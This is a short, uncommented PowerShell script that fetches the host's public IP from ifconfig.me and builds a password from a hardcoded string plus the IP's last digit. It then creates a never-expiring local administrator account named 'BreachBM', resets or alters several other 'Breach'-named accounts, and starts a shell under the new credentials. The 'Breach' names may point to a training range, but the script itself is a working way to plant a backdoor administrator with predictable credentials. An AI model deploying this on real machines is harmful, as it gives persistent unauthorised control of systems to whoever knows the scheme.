$publicip = (Invoke-WebRequest -uri "http://ifconfig.me/ip" -UseBasicParsing).Content

$lastpublicipdigit = $publicip.Substring($publicip.get_Length()-1)

$pass = "mOGu6nQn+"
$password = $pass+$lastpublicipdigit
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

$username1 = "BreachOdmin"
$username2 = "BreachA"
$username3 = "Breach2"
$username4 = "BreachX"
$username5 = "BreachBM"
$username6 = "BreachB2"
$username6 = "BreachSpecial"

New-LocalUser "$username5" -Password $securePassword -FullName "$username5" -Description "User 5" -PasswordNeverExpires

Add-LocalGroupMember -Group "Administrators" -Member "$username5"

Set-LocalUser -Name “$username1” -Password $securePassword -PasswordNeverExpires 1

Set-LocalUser -Name “$username2” -PasswordNeverExpires 1 -Description "User 2"
Set-LocalUser -Name “$username3” -PasswordNeverExpires 1 -Description "User 3"
Set-LocalUser -Name “$username4” -PasswordNeverExpires 1 -Description "User 4"

$credential = New-Object System.Management.Automation.PSCredential $username5, $securePassword
Start-Process powershell.exe -Credential $credential -WorkingDirectory 'C:\Windows\System32' exit
